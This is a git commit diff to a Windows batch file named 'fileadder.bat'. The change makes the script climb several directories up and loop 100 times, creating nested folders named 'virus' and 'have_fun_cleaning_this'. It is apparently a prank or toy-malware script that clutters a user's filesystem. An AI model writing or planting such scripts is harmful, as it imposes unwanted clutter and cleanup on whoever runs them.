d33891ff87e4bfe31b979e0c4eac6462e23427da
DanielNov2014 <michaelvinthermoller@gmail.com>
2025-04-14 08:59:29 +0200

    Update fileadder.bat

--- fileadder.bat
+++ fileadder.bat
@@ -3,16 +3,19 @@ Set /a loop = 0
 :loopstart
 ping 127.0.0.1 -n 1 -w 50 >nul
 cd ..
+cd ..
+cd ..
+cd ..
 mkdir virus%loop%
 cd virus%loop%
 mkdir have_fun_cleaning_this
 cd ..
-cd Malware
+cd ..
 ping 127.0.0.1 -n 1 -w 50 >nul
 goto check
 
 :check
-if %loop% == 10 goto done
+if %loop% == 100 goto done
 echo %loop%
 Set /a loop += 1
 goto loopstart
